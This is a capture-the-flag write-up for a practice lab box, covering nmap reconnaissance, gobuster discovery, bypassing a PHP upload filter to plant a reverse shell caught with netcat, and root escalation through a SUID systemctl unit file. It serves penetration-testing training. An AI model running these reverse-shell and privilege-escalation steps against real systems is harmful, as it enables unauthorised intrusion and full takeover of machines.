# Vulnversity
target ip: 10.10.165.42
my machine ip: 10.9.234.242

#### Reconnaissance
1. There are many nmap "cheatsheets" online that you can use too.
    - No answer required
2. Scan the box, how many ports are open
    - Perform NMAP Scan: `nmap -sC -sV 10.10.165.42`
3. What version of the squid proxy is running on the machine?
    - check the open port 3128 for the version
4. How many ports will nmap scan if the flag -p-400 was used?
    - check the manual for NMAP for the flag. `man nmap`
5. Using the nmap flag -n what will it not resolve?
    - check the manual for NMAP for the flag. `man nmap`
6. What is the most likely operating system this machine is running?
    - check the result of the NMAP scan or perform another scan `nmap -O 10.10.165.42`
7. What port is the web server running on?
    - check the nmap result, which port is Apache webserver working with?
8. Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)
    - No answer required.

#### Locating directories using GoBuster
1. Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.
    - No answer required
2. What is the directory that has an upload form page?
    - Perform a gobuster scan: `gobuster dir -w <wordlist for directories> -u http://10.10.165.42:3333`
    - Check the directories or file outputted by gobuster

#### Compromise the webserver
1. Try upload a few file types to the server, what common extension seems to be blocked?
    - what file format does apache webserver usually run?
2. To identify which extensions are not blocked, we're going to fuzz the upload form. To do this, we're going to use BurpSuite. If you are unsure to what BurpSuite is, or how to set it up please complete our BurpSuite room first.
    - No answer required
3. Run this attack, what extension is allowed?
    - create a wordlist file that consist of: php, php3, php4, php5, phtml
    - get the php reverse shell from this link https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
    - make sure to change the listening ip and port within the file
    - intercept the post request for the file upload to the website with burpsuite and send it to the intruder. Target the payload that you want to modify using the wordlist that you've created.
    - Check the responses from the intruder window which extension was able to pass-through
4. What is the name of the user who manages the webserver?
    - Now that our file has been uploaded, in your terminal run this commmand `nc -lvnp <port you've added>`
    - Go to /internal/uploads and click on the shell that we've uploaded and boom! We have a shell
    - Go to /home to see who's the user.
5. What is the user flag?
    - check the files under /home/bill

#### Privilege Escalation
1. On the system, search for all SUID files. What file stands out?
    - Perform the command: `find / -perm /4000 2>/dev/null` and find the command/file that stands out
2. Become root and get the last flag (/root/root.txt)
    - go to the link https://gtfobins.github.io/ and search for systemctl SUID
    - peform this command on the shell
    ```
    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"
    [Install]
    WantedBy=multi-user.target' > $TF
    /bin/systemctl link $TF
    /bin/systemctl enable --now $TF
    ```
